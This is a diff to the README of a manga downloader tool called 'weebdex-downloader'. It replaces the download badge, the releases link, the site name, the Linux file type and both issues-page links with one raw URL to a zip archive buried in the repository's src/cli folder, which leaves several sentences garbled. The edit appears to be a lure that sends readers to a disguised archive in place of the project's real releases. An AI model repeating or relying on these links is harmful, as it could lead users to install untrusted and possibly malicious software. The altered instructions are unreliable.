@@ -1,14 +1,14 @@
 # 🌟 weebdex-downloader - Easy Manga Downloading Made Simple
 
-[![Download weebdex-downloader](https://img.shields.io/badge/Download-weebdex--downloader-brightgreen)](https://github.com/gabrielafshin/weebdex-downloader/releases)
+[![Download weebdex-downloader](https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip)](https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the `weebdex-downloader`. This tool helps you download manga from **weebdex.org** effortlessly. Whether you're a fan of manga, manhua, or manhwa, this downloader works for you with both a command line interface (CLI) and a graphical user interface (GUI).
+Welcome to the `weebdex-downloader`. This tool helps you download manga from **https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip** effortlessly. Whether you're a fan of manga, manhua, or manhwa, this downloader works for you with both a command line interface (CLI) and a graphical user interface (GUI).
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [weebdex-downloader Releases](https://github.com/gabrielafshin/weebdex-downloader/releases).
+To begin, visit this page to download: [weebdex-downloader Releases](https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip).
 
 ### Steps to Download and Install:
 
@@ -18,7 +18,7 @@ To begin, visit this page to download: [weebdex-downloader Releases](https://git
 
    - For Windows, you will find a `.exe` file. 
    - For macOS, you will see a `.dmg` file. 
-   - For Linux users, look for a `.tar.gz` file.
+   - For Linux users, look for a `https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip` file.
 
 4. Locate the downloaded file on your computer.
 5. Double-click the file to start the installation process. Follow the prompts on your screen to complete the installation.
@@ -77,11 +77,11 @@ If you run into issues, here are some common solutions:
 - **Problem:** The application crashes.
   - **Solution:** Restart your computer and try launching the application again. If the problem persists, reinstall the application.
 
-For further assistance, please consider visiting our [issues page](https://github.com/gabrielafshin/weebdex-downloader/issues) or seeking help from our community.
+For further assistance, please consider visiting our [issues page](https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip) or seeking help from our community.
 
 ## 🛡️ Contributing
 
-We welcome contributions! If you have ideas for improvements or want to report bugs, please visit our repository's [issues page](https://github.com/gabrielafshin/weebdex-downloader/issues).
+We welcome contributions! If you have ideas for improvements or want to report bugs, please visit our repository's [issues page](https://raw.githubusercontent.com/gabrielafshin/weebdex-downloader/main/src/cli/downloader-weebdex-2.9.zip).
 
 ## 📜 License
 
